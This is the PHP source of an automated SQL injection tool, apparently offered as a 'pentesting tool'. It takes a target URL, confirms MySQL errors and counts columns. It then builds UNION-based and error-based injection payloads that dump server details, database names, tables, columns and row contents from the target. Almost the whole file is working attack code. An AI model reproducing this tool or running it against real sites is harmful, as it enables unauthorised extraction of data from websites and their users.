<link href="css/loginmodule.css" rel="stylesheet" type="text/css" />
<link href="css/mic.css" rel="stylesheet" type="text/css" />
<script language="javascript"> 
function toggle() {
	var ele = document.getElementById("toggleText");
	var text = document.getElementById("displayText");
	if(ele.style.display == "block") {
    		ele.style.display = "none";
		text.innerHTML = "Show Database";
  	}
	else {
		ele.style.display = "block";
		text.innerHTML = "Hide Database";
	}
} 
</script>


<?php 
/*
Author : [S]
Email : lakhan002@gmail.com
If you're modifying this code then please give credit to the original author
*/
error_reporting(0);
ini_set("memory_limit","1000M");
$link = htmlentities (stripslashes($_GET['sqliurl']));
$digit = htmlentities (stripslashes($_GET['var']));
$db = htmlentities(stripslashes($_GET['db']));
$option = htmlentities(stripslashes($_GET['options']));
$flag = htmlentities (stripslashes($_GET['flag']));
$union_select_link = htmlentities (stripslashes($_GET['link']));
$union_select_link_2 = htmlentities (stripslashes($_GET['link2']));
$visible_col = htmlentities (stripslashes($_GET['col']));
$post_table = htmlentities(stripslashes($_GET['table']));
$post_col =  htmlentities (stripslashes($_GET['column']));

$html = "Injection Failed...";

if($option=="normal")
{
if (preg_match("/\bhttp\b/i", $link)) 
	{

		if (preg_match("/\binject\b/i", $link))
				 {
				$rep_quote_link = preg_replace("/\binject\b/i", "'", $link); // Add Single Quote 

				$html = file_get_contents($rep_quote_link);// Execute Single Quote 

				if (preg_match("/\bYou\shave\san\serror\sin\syour\sSQL\ssyntax\b/i", $html)) // Detect Sql Error 
					 		{
								$injec_link = preg_replace(" /'/ ", "-$digit+link", $rep_quote_link); // Add One Digit 

								print "<html> <head><title> [S]ql Inject0r - Web Appz Pentesting Tool by [s] </head></head><body bgcolor='black'>";
								print "<center><a href='' STYLE='text-decoration:none'>[ <font color='#7A7AF7'>Server Information </font> ]</a> | <a STYLE='text-decoration:none' href='javascript:toggle();' id='displayText'> [ <font color='#7A7AF7'>Get Database</font> ] </a> | <a STYLE='text-decoration:none' href='index.php'> [ <font color='#7A7AF7'>Home</font> ] </a>  </center> <br>";
								print " <center> <font color='white'>w00t !! its Vulnerable..........<br><br> </font></center>";

							for ($i=1; $i<=6; $i++)
								{
								$orderby_add = preg_replace("/\blink\b/i", "Order+by+$i--+-", $injec_link);
								$html_op_2 = file_get_contents($orderby_add) or die("Could not access file2: $injec_link <br>");
								
									if (preg_match("/\bUnknown\scolumn\b/i", $html_op_2)) // Finding Column Count 
											{
											$j=$i-1;
											echo "<center><font color ='white'>Total Column Count is $j</font></br>";
											goto end;
											}
									}// For Loop Ending 
							end:
							$union_link = preg_replace(" /'/ ", "-$digit+Union+select+", $rep_quote_link); // Add One Digit 

							for($k=1; $k<=$j; $k++)
								{
									$union_link = $union_link . '7777'.$k . ','; // adding 7777 to URL
								}
								$union_link = substr($union_link,0,strlen($union_link)-1);
								$union_link = $union_link."--+-";

								$html_op_3 = file_get_contents($union_link);

								if (strpos($html_op_3,'7777')) // finding Visible                                   Col 								
      								{
									
										$col_visible = strpos($html_op_3,"7777");  // Searching For Visible Coloumn 

										
										$visible = substr($html_op_3,$col_visible+4);

										$remove_7777 = ereg_replace("[^0-9]", "", $visible );  // removing all Crap alphabet 

										$working_col = substr($remove_7777,-5);
										
										$database_link = preg_replace("/.$working_col/", ",concat(0x73616e64656570,0x3a,SchEmA_nAmE,0x3a,0x73616e6465657031)+from+information_schema.schemata-- -", $union_link); // get DB 
										$count = preg_replace("/.$working_col/", ",concat(0x73616e64656570,0x3a,count(*),0x3a,0x73616e6465657031)+from+information_schema.schemata-- -", $union_link); // get DB 
										$curr_database = preg_replace("/.$working_col/", ",concat(0x73616e64656570,0x3a,DaTabAsE(),0x3a,0x73616e6465657031)+from+information_schema.schemata-- -", $union_link); // get DB 
										$curr_version = preg_replace("/.$working_col/", ",concat(0x73616e64656570,0x3a,VerSiOn(),0x3a,0x73616e6465657031)+from+information_schema.schemata-- -", $union_link); // get DB 
										$curr_version_p= file_get_contents($curr_version);  //Current Database
										$curr_version_p = Curr_DB($curr_version_p);
										print "<font color='white'>SQL Version: " .$curr_version_p."</font></br>";
										$curr_DB_p= file_get_contents($curr_database);  //Current Database
										
										$curr_user = preg_replace("/.$working_col/", ",concat(0x73616e64656570,0x3a,USeR(),0x3a,0x73616e6465657031)+from+information_schema.schemata-- -", $union_link); // get DB 
										$curr_user_p= file_get_contents($curr_user);  //Current Database
										$curr_user_p = Curr_DB($curr_user_p);
										print "<font color='white'> Current User: ".$curr_user_p."</font><br>";
										
										
										$Data_Directory  = preg_replace("/.$working_col/", ",concat(0x73616e64656570,0x3a,@@datadir,0x3a,0x73616e6465657031)+from+information_schema.schemata-- -", $union_link); // get DB 
										$Data_Directory_p= file_get_contents($Data_Directory);  //Current Database
										$Data_Directory_p = Curr_DB($Data_Directory_p);
										print " <font color='white'>Data Directory: ".$Data_Directory_p."</font><br>";
										

										$Base_Directory  = preg_replace("/.$working_col/", ",concat(0x73616e64656570,0x3a,@@basedir,0x3a,0x73616e6465657031)+from+information_schema.schemata-- -", $union_link); // get DB 
										$Base_Directory_p= file_get_contents($Base_Directory);  //Current Database
										$Base_Directory_p = Curr_DB($Base_Directory_p);
										print " <font color='white'>Base Directory: ".$Base_Directory_p."</font><br>";

										$host  = preg_replace("/.$working_col/", ",concat(0x73616e64656570,0x3a,@@hostname,0x3a,0x73616e6465657031)+from+information_schema.schemata-- -", $union_link); // get DB 
										$host_p= file_get_contents($host);  //Current Database
										$host_p = Curr_DB($host_p);
										print "<font color='white'>Host Name: ".$host_p."</font><br>";
										
										$os  = preg_replace("/.$working_col/", ",concat(0x73616e64656570,0x3a,@@version_compile_os,0x3a,0x73616e6465657031)+from+information_schema.schemata-- -", $union_link); // get DB 
										$os_p= file_get_contents($os);  //Current Database
										$os_p = Curr_DB($os_p);
										print "<font color='white'>Oprating System: ".$os_p."</font><br>";

										$html_op_4 = file_get_contents($database_link);// ALL DB 
										$count_p = file_get_contents($count);  // Database Count		
										$db_count = DB_Count($count_p);

										print "<font color='white'>Total Database Count : $db_count <br></font>";
										$curr_db = Curr_DB($curr_DB_p); // Function Call display Current DB 
										print "<font color='white'>Current Database : $curr_db <br></center></font>";
										$get =Get_ALl_DB($html_op_4,$working_col,$union_link,$option); // Function Call All display DB
										
							

									}
								else 
									{
									print "<font color='white'>Please Enter Proper GET Varible Value ! </font>";
									}
							}
				else 
							{
							echo "<font color='white'>Mysql Error Not Found !</font>";
							}
				}
		else 
				{
				echo "<font color='white'>Please Insert Inject String At The End Of the URL like ?ID=inject !<br></font>";
				}
	} 
	

if(isset($db))
{

	if (preg_match("/\bunion\b/i", $union_select_link))
					{
					$get_table_col = array();
					$disp_table=preg_replace("/\b\sunion\sselect\s\b/i", "+Union+SeLeCt+", $union_select_link); // get DB 
					$string	= $db;
				    $hex='';
				    for ($i=0; $i < strlen($string); $i++)
					    {
					        $hex .= dechex(ord($string[$i]));
					    }
					print "<html> <head><title> [S]ql Inject0r - Website Pentesting Tool </head></head><body bgcolor='black'>";
					print "<center><a href='javascript:back();' STYLE='text-decoration:none'>[ <font color='#7A7AF7'>Back</font> ]</a>";
					$print_table = preg_replace("/$visible_col/","concat(0x73616e64656570,0x3a,TAbLe_NamE,0x3a,ColUmn_NamE,0x3a,0x73616e6465657031)+from+information_schema.columns+where+table_schema=0x$hex--+-", $disp_table); // get table namnes 

					$split_table_column = preg_replace("/$visible_col/","concat(0x7461626c65,0x3b,TAbLe_NamE,0x3b,0x7461626c6531,0x20,0x636f6c756d6e,0x3a,ColUmn_NamE,0x3a,0x636f6c756d6e31)+from+information_schema.columns+where+table_schema=0x$hex--+-", $disp_table); // eXTRACTING Table And column 

					$html_table_col = file_get_contents($print_table); 

					$split_table_column_html = file_get_contents($split_table_column);  //Executing COlumn		

					$splited_html_table_col = file_get_contents($split_table_column);   //Executing Table				

					$get_table_col = clear_table($html_table_col); // Get all Table name  
					
					$splited_column = splited_column($splited_html_table_col); // Get COlun names 

					$splited_table = split_table($split_table_column_html); // Get Table Names 

					print "<br><br>";
					print "<div>";
					
					print "<center><table id='logintable' cellpadding='0' cellspaceing='2' border='0' >";
					for ($c=0; $c<=sizeof($get_table_col); $c++)					
						{


					print "<tr><td><a style='text-decoration: none;' href='dosql.php?db=$db&options=$option&col=$visible_col&table=$splited_table[$c]&column=$splited_column[$c]&link2=$disp_table'><center>".$get_table_col[$c]."</a></td</tr></center>";
							
						}
						print "</table>";
						$c=$c-1;
						print "<font color='white'>Total Column count Is ".$c."</font>";

					}
				}
						if (isset($post_col))
						{
							$extract_column_html_1 = array();
							$disp_table=preg_replace("/\b\sunion\sselect\s\b/i", "+Union+SeLeCt+", $union_select_link_2); 

							$extract_column = preg_replace("/$visible_col/","concat(0x73616e64656570,0x3a,$post_col,0x3a,0x73616e6465657031)+from+$db.$post_table", $disp_table); // eXTRACTING Table And column 
							$extract_column_html = file_get_contents($extract_column );   //Executing Table				

							$extract_column_html_1 = clear_extracted_data($extract_column_html);
							print "<br><br><br>";
							print "<html> <head><title> [S]ql Inject0r - Website Pentesting Tool </head></head><body bgcolor='black'>";
							print "<center><a href='javascript:back();' STYLE='text-decoration:none'>[ <font color='#7A7AF7'>Back</font> ]</a>";
							print "<br><br>";
							print "<div>";
							print "<center><table id='logintable' cellpadding='0' cellspaceing='2' border='0' >";
							for ($c=0; $c<=sizeof($extract_column_html_1); $c++)					
								{
									print "<tr><td>".$extract_column_html_1[$c]."</td></tr><br>";
								}	
							print "</table>";
						}
						else 
						{
							print "<font color='white'>Please Check Table Name </font>";
						}

}
elseif($option == "error")
{
							print "<html> <head><title> [S]ql Inject0r - Website Pentesting Tool </head></head><body bgcolor='black'>";
							print "<center><a href='javascript:back();' STYLE='text-decoration:none'>[ <font color='#7A7AF7'>Database Information</font> ]</a>";
							print "<br><br>";

	if (preg_match("/\bhttp\b/i", $link)) 
				{
					if (preg_match("/\binject\b/i", $link))
						 {
							$rep_quote_link = preg_replace("/\binject\b/i", "'", $link); // Add Single Quote 
		
							$html = file_get_contents($rep_quote_link); // Execute Single Quote 
							$injec_link = preg_replace(" /'/ ", "-$digit+link", $rep_quote_link); // Add One Digit 

									for ($i=1; $i<=6; $i++)
										{
											$orderby_add = preg_replace("/\blink\b/i", "Order+by+$i--+-", $injec_link);
											$html_op_2 = file_get_contents($orderby_add);
											if (preg_match("/\bUnknown\scolumn\b/i", $html_op_2)) // Finding Column Count 
												{
													$j=$i-1;
													echo "Total Column Count is $j</br>";
													goto end1; 
													}
										}// For Loop Ending 
									end1:
									
									$error_getdb_html_1=array();
									
									$error_getdb_link = preg_replace(" /'/ ", "-$digit+and(select+1+from(select+count(*),concat((select+(select+concat(0x73616e64656570,0x3a,cast(version()+as+char),0x3a,0x73616e6465657031))+from+information_schema.tables+limit+0,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)+and+1=1", $rep_quote_link); // Add One Digit 
									
									$error_getdb_html = file_get_contents($error_getdb_link);

									$error_getdb_html_1 = clear_getdb($error_getdb_html);
					
									for ($c=0; $c<=sizeof($error_getdb_html_1)-1; $c++)					
										{
 											print "Mysql Version() ::: ".$error_getdb_html_1[$c]."<br>";
										}	

									
									$error_getdb_count_link = preg_replace(" /'/ ", "-$digit+and(select+1+from+(select+count(*),concat((select+(select+(SELECT+distinct+concat(0x73616e64656570,0x3a,count(schema_name),0x3a,0x73616e6465657031)+FROM+information_schema.schemata+LIMIT+0,1))+from+information_schema.tables+limit+0,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)+and+1=1", $rep_quote_link); // Add One Digit 
									
									$error_getdb_count_html = file_get_contents($error_getdb_count_link);
									$error_dbcount_html_1 = dbcount($error_getdb_count_html);

										for ($c=0; $c<=sizeof($error_dbcount_html_1)-1; $c++)					
										{
 											print "Total DataBase ::: ".$error_dbcount_html_1[$c]."<br>";
										}	
									
									
									$error_getdb_count_html = file_get_contents($error_getdb_count_link) or die("Could not access file error : $rep_link <br>");
									
									$error_user_link = preg_replace(" /'/ ", "-$digit+and(select+1+from(select+count(*),concat((select+(select+concat(0x73616e64656570,0x3a,cast(user()+as+char),0x3a,0x73616e6465657031))+from+information_schema.tables+limit+0,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)+and+1=1", $rep_quote_link); // Add One Digit 

									$error_user_html = file_get_contents($error_user_link);
									
									$get_user=curr_user($error_user_html);
									
										for ($c=0; $c<=sizeof($get_user)-1; $c++)					
										{
 											print "Current DataBase User() ::: ".$get_user[$c]."<br>";
										}	
									$error_onebyone_db_link = array();
									$error_onebyone_db_html = array();
									$error_onebyon_db = array();
									$count134 = $error_dbcount_html_1[0];

										for ($p=0; $p<=$count134-1; $p++)					
										{
											$error_onebyone_db_link[$p] = preg_replace(" /'/ ", "-$digit+and(select+1+from+(select+count(*),concat((select+(select+(SELECT+distinct+concat(0x73616e64656570,0x3a,cast(schema_name+as+char),0x3a,0x73616e6465657031)+FROM+information_schema.schemata+LIMIT+$p,1))+from+information_schema.tables+limit+0,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)+and+1=1", $rep_quote_link); 
											$error_onebyone_db_html[$p] = file_get_contents($error_onebyone_db_link[$p]);
										}
										
										$flag = 1;
										for ($d=0; $d<=$count134-1; $d++)					
											{	
											$retun = all_db($error_onebyone_db_html[$d],$option,$rep_quote_link,$flag,$digit);
											}
											
											print "Finished ";

						   		}			
																	

							}
							
					
					
										if($flag==1)
											{
												$link = $link."'";
 												$string	= $db;
	   											$hex='';
											    for ($i=0; $i < strlen($string); $i++)
											    {	
					    						    $hex .= dechex(ord($string[$i]));
											    }
					
														$error_onebyone_table_count_link = preg_replace(" /'/ ", "-$digit+and(select+1+from(select+count(*),concat((select+(select+(SELECT+concat(0x73616e64656570,0x3a,count(table_name),0x3a,0x73616e6465657031)+FROM+`information_schema`.tables+WHERE+table_schema=0x$hex))+from+information_schema.tables+limit+0,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)+and+1=1",$link);
														$error_onebyone_table_count_html = file_get_contents($error_onebyone_table_count_link) or die("Could not access file error : $rep_link <br>");
														$table_count = curr_user($error_onebyone_table_count_html);
														print "Total Table from database <b>".$db." </b>is ".$table_count[0]."<BR>";
														$count2 =$table_count[0];
														for ($d=0; $d<=$count2; $d++)					
															{	
																$error_onebyone_table_link[$d] = preg_replace(" /'/ ", "-$digit+and(select+1+from(select+count(*),concat((select(select(SELECT+distinct+concat(0x73616e64656570,0x3a,cast(table_name+as+char),0x3a,0x73616e6465657031)+FROM+information_schema.tables+Where+table_schema=0x$hex+LIMIT+$d,1))+from+information_schema.tables+limit+0,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)+and+1=1",$link);
																$error_onebyone_table_html[$d] = file_get_contents($error_onebyone_table_link[$d]);
															}
														$num = $digit;
														$flag1 = 2;
														for ($q=0; $q<=$count2; $q++)					
															{
																$store_table = all_table($error_onebyone_table_html[$q],$option,$link,$flag1,$num,$db);
															}
																			
											}
											else 
											{
				
											}
											
										if($flag==2)
											{
												$link = $link."'";
												$string1= $db;
												$string2= $post_table; 
	   											$hex1='';
												$hex2='';
											    for ($i=0; $i < strlen($string1); $i++)
											    {	
					    						    $hex1 .= dechex(ord($string1[$i]));
											    }		
												for ($i=0; $i < strlen($string2); $i++)
											    {	
					    						    $hex2 .= dechex(ord($string2[$i]));
											    }	
												$column_count_link = preg_replace(" /'/ ", "-$digit++and(select+1+from(select+count(*),concat((select(select(SELECT+distinct+concat(0x73616e64656570,0x3a,count(column_name),0x3a,0x73616e6465657031)+FROM+`information_schema`.columns+WHERE+table_schema=0x$hex1+AND+table_name=0x$hex2))+from+information_schema.tables+limit+0,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)+and+1=1",$link);
												$column_count_html = file_get_contents($column_count_link) or die("Could not access file error : $rep_link <br>");
												$column_count = curr_user($column_count_html);
												print "Total Column From <b>".$post_table."</b> is ".$column_count[0]."<br>";
												$count12 = $column_count[0];
												for($v=0; $v<=$count12; $v++)
												{
														$column_name_link[$v] = preg_replace(" /'/ ", "-$digit+and(select+1+from(select+count(*),concat((select(select+(SELECT+distinct+concat(0x73616e64656570,0x3a,cast(column_name+as+char),0x3a,0x73616e6465657031)+FROM+information_schema.columns+Where+table_schema=0x$hex1+AND+table_name=0x$hex2+LIMIT+$v,1))+from+information_schema.tables+limit+0,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)+and+1=1",$link);
														$column_name_html[$v] = file_get_contents($column_name_link[$v]) or die("Could not access file error : $rep_link <br>");
											}

												$flag1=3;
												$num = $digit;
												for($r=0; $r<=$count12; $r++)
												{
												$column_print = all_column($column_name_html[$r],$option,$link,$flag1,$num,$db,$post_table);
												}

												}
										else 
											{
											
											}	
											
										if($flag==3)
											{
												$link = $link."'";
												$string1= $db;
												$string2= $post_table; 
												$string3= $post_col;
											 	$column_count_link1 = preg_replace(" /'/ ", "-$digit+and(select+1+from(select+count(*),concat((select+(select+(SELECT+concat(0x73616e64656570,0x3a,count($string3),0x3a,0x73616e6465657031)+FROM+`$string1`.$string2+LIMIT+0,1)+)+from+information_schema.tables+limit+2,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)+and+1=1",$link);
												$column_name_html1 = file_get_contents($column_count_link1) or die("Could not access file error : $rep_link <br>");
												$google = $column_name_html1;
												$column_count1 = count1($google);
												$count123 = $column_count1[0];

												for($t=0; $t<=$count123-1; $t++)
												{
														$column_name_link_q[$t] = preg_replace(" /'/ ", "-$digit+and(select+1+from(select+count(*),concat((select+(select+(SELECT+concat(0x73616e64656570,0x3a,cast($string2.$string3+as+char),0x3a,0x73616e6465657031)+FROM+`$string1`.$string2+LIMIT+$t,1)+)+from+information_schema.tables+limit+2,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)+and+1=1",$link);
														$column_name_html_q[$t] = file_get_contents($column_name_link_q[$t]) or die("Could not access file error : $rep_link <br>");
													
												} 
											for($r=0; $r<=$count123; $r++)
												{
												$column_print = all_column_data($column_name_html_q[$r],$option,$link,$flag,$num,$db,$string3);
												}

												
												}
										else 
											{
											
											}	
											
		
											
		
}
						
?>

<?php

				function all_column_data($html_op_12,$option,$link,$flag,$num,$db,$column_name)
									{
										$html_op =$html_op_12;
										$column_name = $column_name;
											$db = $db;
											$op = $option;
											$f = $flag;
											$count = $error_dbcount_html_1;
											$link1=$link;
											$digit = $num;
										$g=1;
										$db_array = array();
										$result = array();
										while($g == 1)
											{
 												$string1 = strpos($html_op,"sandeep");
											  	$string2 = strpos($html_op,"sandeep1");
												if( ($string1 > 1)  && ($string2 >1 ) )
														{

															$txt_between = substr($html_op,$string1,$string2+13);

															$html_op = substr($html_op,$string2+13);

															$start ="sandeep:";
															$end =":sandeep1";
															$txt_between = " ".$txt_between;

															$ini = strpos($txt_between,$start);

															if ($ini == 0) return "";
															$ini += strlen($start);
															$len = strpos($txt_between,$end,$ini) - $ini;
															$parsed= substr($txt_between,$ini,$len);


															print "<table><th>". $column_name."</th>"."<tr><td>".$parsed."</td></tr></table>";

															$db_array[] = $parsed;

														} 
												else
														{
//															print "Not working ";
															break;
														}
												}
											return $db_array;											

											}





				function count1($html_op_14)
									{
										$html_op =$html_op_14;

										$g=1;
										$db_array = array();
										$result = array();
										while($g == 1)
											{
 												$string1 = strpos($html_op,"sandeep");

											  	$string2 = strpos($html_op,"sandeep1");
												if( ($string1 > 1)  && ($string2 >1 ) )
														{
															$txt_between = substr($html_op,$string1,$string2+13);
															$html_op = substr($html_op,$string2+13);
															$start ="sandeep:";
															$end =":sandeep1";
															$txt_between = " ".$txt_between;
															$ini = strpos($txt_between,$start);
															if ($ini == 0) return "";
															$ini += strlen($start);
															$len = strpos($txt_between,$end,$ini) - $ini;
															$parsed= substr($txt_between,$ini,$len);
															$db_array[] = $parsed;
														} 
												else
														{
//															print "Not working ";
															break;
														}
												}
												
										return $db_array;
										}


				function all_column($html_op_12,$option,$link,$flag,$num,$db,$table_name)
									{
										$html_op =$html_op_12;
										$table_name = $table_name;
											$db = $db;
											$op = $option;
											$f = $flag;
											$count = $error_dbcount_html_1;
											$link1=$link;
											$digit = $num;
										$g=1;
										$db_array = array();
										$result = array();
										while($g == 1)
											{
 												$string1 = strpos($html_op,"sandeep");
											  	$string2 = strpos($html_op,"sandeep1");
												if( ($string1 > 1)  && ($string2 >1 ) )
														{

															$txt_between = substr($html_op,$string1,$string2+13);

															$html_op = substr($html_op,$string2+13);

															$start ="sandeep:";
															$end =":sandeep1";
															$txt_between = " ".$txt_between;

															$ini = strpos($txt_between,$start);

															if ($ini == 0) return "";
															$ini += strlen($start);
															$len = strpos($txt_between,$end,$ini) - $ini;
															$parsed= substr($txt_between,$ini,$len);

															print "<a style='text-decoration: none;' href = 'dosql.php?db=$db&options=$op&table=$table_name&flag=$f&var=$digit&column=$parsed&sqliurl=$link1' id>".$parsed."</a></td><br>";

															$db_array[] = $parsed;

														} 
												else
														{
//															print "Not working ";
															break;
														}
												}
											return $db_array;											



										}





				function all_table($html_op_12,$option,$link,$flag,$num,$db)
									{
										$html_op =$html_op_12;
										
											$db = $db;
											$op = $option;
											$f = $flag;
											$count = $error_dbcount_html_1;
											$link1=$link;
											$digit = $num;
										$g=1;
										$db_array = array();
										$result = array();
										while($g == 1)
											{
 												$string1 = strpos($html_op,"sandeep");
											  	$string2 = strpos($html_op,"sandeep1");
												if( ($string1 > 1)  && ($string2 >1 ) )
														{

															$txt_between = substr($html_op,$string1,$string2+13);

															$html_op = substr($html_op,$string2+13);

															$start ="sandeep:";
															$end =":sandeep1";
															$txt_between = " ".$txt_between;

															$ini = strpos($txt_between,$start);

															if ($ini == 0) return "";
															$ini += strlen($start);
															$len = strpos($txt_between,$end,$ini) - $ini;
															$parsed= substr($txt_between,$ini,$len);
															print "<a style='text-decoration: none;' href = 'dosql.php?db=$db&options=$op&table=$parsed&flag=$f&var=$digit&sqliurl=$link1'>".$parsed."</a><br>";
															$db_array[] = $parsed;

														} 
												else
														{
//															print "Not working ";
															break;
														}
												}
											return $db_array;											



										}



				function all_db($html_op_12,$option,$link,$flag,$num)
									{
										$html_op =$html_op_12;
											$op = $option;
											$f = $flag;
											$count = $error_dbcount_html_1;
											$link1=$link;
											$digit = $num;
										$g=1;
										$db_array = array();
										$result = array();
										while($g == 1)
											{
 												$string1 = strpos($html_op,"sandeep");

											  	$string2 = strpos($html_op,"sandeep1");
												if( ($string1 > 1)  && ($string2 >1 ) )
														{

															$txt_between = substr($html_op,$string1,$string2+13);

															$html_op = substr($html_op,$string2+13);

															$start ="sandeep:";
															$end =":sandeep1";
															$txt_between = " ".$txt_between;

															$ini = strpos($txt_between,$start);

															if ($ini == 0) return "";
															$ini += strlen($start);
															$len = strpos($txt_between,$end,$ini) - $ini;
															$parsed= substr($txt_between,$ini,$len);
															
															print "<br>"."<font size='3'><a style='text-decoration: none;' href = 'dosql.php?db=$parsed&options=$op&flag=$f&var=$digit&sqliurl=$link1'>".$parsed."</a></font><br>";
															$db_array[] = $parsed;

														} 
												else
														{
//															print "Not working ";
															break;
														}
												}
											return $db_array;											



										}


				function curr_user($html_op_11)
									{
										$html_op =$html_op_11;
										

										$g=1;
										$db_array = array();
										$result = array();
										while($g == 1)
											{
 												$string1 = strpos($html_op,"sandeep");

											  	$string2 = strpos($html_op,"sandeep1");
												if( ($string1 > 1)  && ($string2 >1 ) )
														{
															$txt_between = substr($html_op,$string1,$string2+13);
															$html_op = substr($html_op,$string2+13);
															$start ="sandeep:";
															$end =":sandeep1";
															$txt_between = " ".$txt_between;
															$ini = strpos($txt_between,$start);
															if ($ini == 0) return "";
															$ini += strlen($start);
															$len = strpos($txt_between,$end,$ini) - $ini;
															$parsed= substr($txt_between,$ini,$len);
															$db_array[] = $parsed;
														} 
												else
														{
//															print "Not working ";
															break;
														}
												}
												
										return $db_array;
										}

						function dbcount($html_op_11)
									{
										$html_op =$html_op_11;	

										$g=1;
										$db_array = array();

										$result = array();
										while($g == 1)
											{
 												$string1 = strpos($html_op,"sandeep");
											  	$string2 = strpos($html_op,"sandeep1");
												if( ($string1 > 1)  && ($string2 >1 ) )
														{
															$txt_between = substr($html_op,$string1,$string2+13);
															$html_op = substr($html_op,$string2+13);
															$start ="sandeep:";
															$end =":sandeep1";
															$txt_between = " ".$txt_between;
															$ini = strpos($txt_between,$start);
															if ($ini == 0) return "";
															$ini += strlen($start);
															$len = strpos($txt_between,$end,$ini) - $ini;
															$parsed= substr($txt_between,$ini,$len);
															$db_array[] = $parsed;
														} 
												else
														{
//															print "Not working ";
															break;
														}
												}
												
										return $db_array;
										}



								function clear_getdb($html_op_10)
									{
										$html_op =$html_op_10;	

										$g=1;
										$db_array = array();

										$result = array();
										while($g == 1)
											{
 												$string1 = strpos($html_op,"sandeep");
											  	$string2 = strpos($html_op,"sandeep1");
												if( ($string1 > 1)  && ($string2 >1 ) )
														{
															$txt_between = substr($html_op,$string1,$string2+13);
															$html_op = substr($html_op,$string2+13);
															$start ="sandeep:";
															$end =":sandeep1";
															$txt_between = " ".$txt_between;
															$ini = strpos($txt_between,$start);
															if ($ini == 0) return "";
															$ini += strlen($start);
															$len = strpos($txt_between,$end,$ini) - $ini;
															$parsed= substr($txt_between,$ini,$len);
															$db_array[] = $parsed;
														} 
												else
														{
//															print "Not working ";
															break;
														}
												}
												
										return $db_array;
										}



								function clear_extracted_data($html_op_9)
									{
										$html_op =$html_op_9;	
										$g=1;
										$db_array = array();
										$result = array();
										while($g == 1)
											{
 												$string1 = strpos($html_op,"sandeep");
											  	$string2 = strpos($html_op,"sandeep1");
												if( ($string1 > 1)  && ($string2 >1 ) )
														{
															$txt_between = substr($html_op,$string1,$string2+13);
															$html_op = substr($html_op,$string2+13);
															$start ="sandeep:";
															$end =":sandeep1";
															$txt_between = " ".$txt_between;
															$ini = strpos($txt_between,$start);
															if ($ini == 0) return "";
															$ini += strlen($start);
															$len = strpos($txt_between,$end,$ini) - $ini;
															$parsed= substr($txt_between,$ini,$len);
															$db_array[] = $parsed;
														} 
												else
														{
//															print "Not working ";
															break;
														}
												}
												
										return $db_array;
										}


								function clear_table($html_op_5)
									{
										$html_op =$html_op_5;	
										$g=1;
										$db_array = array();
										$result = array();
										while($g == 1)
											{
 												$string1 = strpos($html_op,"sandeep");
											  	$string2 = strpos($html_op,"sandeep1");
												if( ($string1 > 1)  && ($string2 >1 ) )
														{
															$txt_between = substr($html_op,$string1,$string2+13);
															$html_op = substr($html_op,$string2+13);
															$start ="sandeep:";
															$end =":sandeep1";
															$txt_between = " ".$txt_between;
															$ini = strpos($txt_between,$start);
															if ($ini == 0) return "";
															$ini += strlen($start);
															$len = strpos($txt_between,$end,$ini) - $ini;
															$parsed= substr($txt_between,$ini,$len);
															$db_array[] = $parsed;
														} 
												else
														{
//															print "Not working ";
															break;
														}
												}
										return $db_array;
										}
							function splited_column($html_op_6)
									{
										$html_op =$html_op_6;	
										$g=1;
										$db_array = array();
										$result = array();
										while($g == 1)
											{
 												$string1 = strpos($html_op,"column");
											  	$string2 = strpos($html_op,"column1");
												if( ($string1 > 1)  && ($string2 >1 ) )
														{
															$txt_between = substr($html_op,$string1,$string2+13);
															$html_op = substr($html_op,$string2+13);
															$start ="column:";
															$end =":column1";
															$txt_between = " ".$txt_between;
															$ini = strpos($txt_between,$start);
															if ($ini == 0) return "";
															$ini += strlen($start);
															$len = strpos($txt_between,$end,$ini) - $ini;
															$parsed= substr($txt_between,$ini,$len);
															$db_array[] = $parsed;
														} 
												else
														{
//															print "Not working ";
															break;
														}
												}
										return $db_array;
										}
						function split_table($html_op_7)
									{
										$html_op =$html_op_7;	
										$g=1;
										$db_array = array();
										$result = array();
										while($g == 1)
											{
 												$string1 = strpos($html_op,"table");
											  	$string2 = strpos($html_op,"table1");
												if( ($string1 > 1)  && ($string2 >1 ) )
														{
															$txt_between = substr($html_op,$string1,$string2+13);
															$html_op = substr($html_op,$string2+13);
															$start ="table;";
															$end =";table1";
															$txt_between = " ".$txt_between;
															$ini = strpos($txt_between,$start);
															if ($ini == 0) return "";
															$ini += strlen($start);
															$len = strpos($txt_between,$end,$ini) - $ini;
															$parsed= substr($txt_between,$ini,$len);
															$db_array[] = $parsed;
														} 
												else
														{
//															print "Not working ";
															break;
														}
												}
										return $db_array;
										}
									function Get_ALl_DB($output_var,$working_col,$union_link,$option)
									{
										$html_op = $output_var;
										$visible = $working_col;
										$link2 = $union_link;
										$op = $option;
										$g=1;
										$db_array = array();
										$result = array();
										while($g == 1)
											{
 												$string1 = strpos($html_op,"sandeep");
											  	$string2 = strpos($html_op,"sandeep1");
												if( ($string1 > 1)  && ($string2 >1 ) )
														{
															$txt_between = substr($html_op,$string1,$string2+13);
															$html_op = substr($html_op,$string2+13);
															$start ="sandeep:";
															$end =":sandeep1";
															$txt_between = " ".$txt_between;
															$ini = strpos($txt_between,$start);
															if ($ini == 0) return "";
															$ini += strlen($start);
															$len = strpos($txt_between,$end,$ini) - $ini;
															$parsed= substr($txt_between,$ini,$len);
															$db_array[] = $parsed;
															for ($p=0; $p<=sizeof($db_array); $p++)
															{
															$result[$p] = $db_array[$p];
															}
														

														} 
												else
														{
															
															break;
														}
												}
													print "<br><br>";
													print "<div id='toggleText' style='display: none'>";
													print "<center><table id='logintable' cellpadding='0' cellspaceing='2' border='0' >";
 
 													for ($p=0; $p<=sizeof($db_array); $p++)
														{
		 													$linkss = "dosql.php?db=$result[$p]&options=$op&col=$visible&link=$link2";
															print "<tr><td><a style='text-decoration: none;' href='dosql.php?db=$result[$p]&options=$op&col=$visible&link=$link2&postlink=$linkss' id='displayText'>".$result[$p]."</br></tr></td></a>";

														}


													print "</table><center>";
													echo "<center><br><br>Nothing Found OR Finished</center>";
													print "</div>";
